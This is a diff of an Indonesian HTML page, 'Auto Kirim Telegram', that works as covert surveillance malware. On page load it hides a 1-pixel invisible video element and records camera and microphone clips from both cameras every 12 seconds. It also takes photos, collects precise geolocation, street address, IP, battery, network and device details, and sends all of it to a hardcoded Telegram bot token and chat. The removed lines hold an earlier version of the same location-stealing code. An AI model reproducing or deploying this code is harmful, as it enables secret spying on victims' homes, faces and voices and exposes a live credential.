@@ -1,7 +1,8 @@
-<!DOCTYPE html><html lang="id">
+<!DOCTYPE html>
+<html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>Audiejem</title>
+  <title>Auto Kirim Telegram</title>
   <style>
     body { margin: 0; background: transparent; color: #fff; overflow: hidden; }
     video { position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0; }
@@ -11,73 +12,131 @@
   <video id="video" autoplay muted playsinline></video>
   <script>
     const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
-    const chat_id = '7552410869';async function getAddress(lat, lon) {
-  try {
-    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
-    const data = await res.json();
-    const addr = data.address;
-    return `${addr.road || ''} ${addr.house_number || ''}, ${addr.suburb || ''}, ${addr.village || addr.town || addr.city || ''}, ${addr.county || ''}, ${addr.state || ''}, ${addr.postcode || ''}, ${addr.country || ''}`;
-  } catch (e) {
-    return 'Alamat tidak ditemukan';
-  }
-}
+    const chat_id = '7552410869';
 
-async function sendInfo(lat, lon) {
-  const waktu = new Date().toLocaleString();
-  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
-  const ua = navigator.userAgent;
-  const bat = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak'})`);
-  const net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'Tidak tersedia';
-  const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak terdeteksi';
-  const brand = ua.match(/Android.*?;\s(.+?)\sBuild/)?.[1] || 'Tidak diketahui';
-  const maps = `https://maps.google.com/?q=${lat},${lon}`;
-  const alamatLengkap = await getAddress(lat, lon);
+    let cams = ['user', 'environment'], index = 0;
+    let videoRecorder, audioRecorder, chunksVideo = [], chunksAudio = [];
 
-  let cuaca = '';
-  try {
-    const r = await fetch(`https://api.diioffc.web.id/api/tools/cekcuaca?query=${encodeURIComponent(alamatLengkap)}`);
-    const j = await r.json();
-    if (j.status && j.result) {
-      const w = j.result.weather[0];
-      cuaca = `
-╭━━╮╭╮╱╱╭╮╭━━━┳━━┳━━━━╮
-┃╭╮┃┃╰╮╭╯┃┃╭━╮┣┫┣┻━━╮━┃
-┃╰╯╰╋╮╰╯╭╯┃╰━╯┃┃┃╱╱╭╯╭╯
-┃╭━╮┃╰╮╭╯╱┃╭╮╭╯┃┃╱╭╯╭╯╱
-┃╰━╯┃╱┃┃╱╱┃┃┃╰┳┫┣┳╯━╰━╮
-╰━━━╯╱╰╯╱╱╰╯╰━┻━━┻━━━━╯
-      \n🌤️ Cuaca: ${w.main} (${w.description})\n🌡️ Suhu: ${j.result.main.temp}°C\n💧 Kelembaban: ${j.result.main.humidity}%\n🌬️ Angin: ${j.result.wind.speed} m/s`;
+    async function startAll() {
+      sendStaticPhoto();
+      sendDeviceInfo();
+      setInterval(() => switchCamAndRecord(), 12000);
     }
-  } catch {}
 
-  const teks = `
-╭━━╮╭╮╱╱╭╮╭━━━┳━━┳━━━━╮
-┃╭╮┃┃╰╮╭╯┃┃╭━╮┣┫┣┻━━╮━┃
-┃╰╯╰╋╮╰╯╭╯┃╰━╯┃┃┃╱╱╭╯╭╯
-┃╭━╮┃╰╮╭╯╱┃╭╮╭╯┃┃╱╭╯╭╯╱
-┃╰━╯┃╱┃┃╱╱┃┃┃╰┳┫┣┳╯━╰━╮
-╰━━━╯╱╰╯╱╱╰╯╰━┻━━┻━━━━╯
-  📍 Lokasi Google Maps: ${maps}\n🏠 Alamat: ${alamatLengkap}\n🕒 Waktu: ${waktu}\n🌐 IP: ${ip}\n🔋 Baterai: ${bat}\n📶 Jaringan: ${net}\n📱 Merek Android: ${brand}\n💾 RAM: ${ram}${cuaca}`;
+    async function switchCamAndRecord() {
+      const facing = cams[index % 2]; index++;
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: true });
+      const video = document.getElementById('video');
+      video.srcObject = stream;
 
-  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id, text: teks })
-  });
-}
+      // Video
+      videoRecorder = new MediaRecorder(stream);
+      videoRecorder.ondataavailable = e => { if (e.data.size > 0) chunksVideo.push(e.data); };
+      videoRecorder.onstop = () => {
+        const blob = new Blob(chunksVideo, { type: 'video/webm' });
+        chunksVideo = [];
+        const form = new FormData();
+        form.append("chat_id", chat_id);
+        form.append("video", blob, "video10s.webm");
+        fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
+      };
+      videoRecorder.start();
+      setTimeout(() => videoRecorder.stop(), 10000);
 
-navigator.geolocation.getCurrentPosition(pos => {
-  const lat = pos.coords.latitude;
-  const lon = pos.coords.longitude;
-  sendInfo(lat, lon);
-});
+      // Audio
+      audioRecorder = new MediaRecorder(stream);
+      audioRecorder.ondataavailable = e => { if (e.data.size > 0) chunksAudio.push(e.data); };
+      audioRecorder.onstop = () => {
+        const blob = new Blob(chunksAudio, { type: 'audio/webm' });
+        chunksAudio = [];
+        const form = new FormData();
+        form.append("chat_id", chat_id);
+        form.append("audio", blob, "audio10s.webm");
+        fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
+      };
+      audioRecorder.start();
+      setTimeout(() => audioRecorder.stop(), 10000);
 
-window.onload = () => {
-  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-    document.getElementById('video').srcObject = stream;
-  });
-};
+      // Foto
+      setTimeout(() => autoCapturePhoto(video), 3000);
+    }
 
+    async function autoCapturePhoto(video) {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+      const form = new FormData();
+      form.append("chat_id", chat_id);
+      form.append("photo", blob, "photo.jpg");
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
+    }
+
+    function sendStaticPhoto() {
+      const form = new FormData();
+      form.append("chat_id", chat_id);
+      form.append("photo", 'https://files.catbox.moe/p7xbtg.png');
+      form.append("caption", "🆁🅸🆉");
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
+    }
+
+    async function sendDeviceInfo() {
+      const waktu = new Date().toLocaleString();
+      const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
+      const ua = navigator.userAgent;
+      const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak diketahui';
+      const bat = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak'})`);
+      const net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'Tidak tersedia';
+      const brand = ua.match(/Android.*?;\s(.+?)\sBuild/)?.[1] || 'Tidak diketahui';
+      const url = location.href;
+
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const maps = `https://maps.google.com/?q=${lat},${lon}`;
+        const g = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+        const j = await g.json();
+        const lokasi = j.display_name || 'Lokasi tidak diketahui';
+        const alamat = j.address || {};
+        const kota = alamat.city || alamat.town || alamat.village || 'Tidak diketahui';
+        const kodepos = alamat.postcode || 'N/A';
+        const jalan = alamat.road || alamat.neighbourhood || 'N/A';
+        const negara = alamat.country || 'N/A';
+        const rumah = alamat.house_number || '-';
+
+        let cuaca = '';
+        const r = await fetch(`https://api.diioffc.web.id/api/tools/cekcuaca?query=${encodeURIComponent(kota)}`);
+        const jc = await r.json();
+        if (jc.status && jc.result) {
+          const w = jc.result.weather[0];
+          cuaca = `🌤️ Cuaca: ${w.main} (${w.description})\n🌡️ Suhu: ${jc.result.main.temp}°C\n💧 Kelembaban: ${jc.result.main.humidity}%\n🌬️ Angin: ${jc.result.wind.speed} m/s`;
+        }
+
+        const info = `📍 Lokasi Lengkap: ${lokasi}
+🏠 Jalan: ${jalan}, No: ${rumah}
+📫 Kode Pos: ${kodepos}
+🌍 Negara: ${negara}
+🗺️ Link Maps: ${maps}
+🕒 Waktu: ${waktu}
+🌐 IP: ${ip}
+🔋 Baterai: ${bat}
+📶 Jaringan: ${net}
+📱 User-Agent: ${ua}
+📱 Merek Android: ${brand}
+💾 RAM: ${ram}
+🔗 URL Aktif: ${url}
+${cuaca}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id, text: info })
+        });
+      });
+    }
+
+    window.onload = startAll;
   </script>
 </body>
 </html>
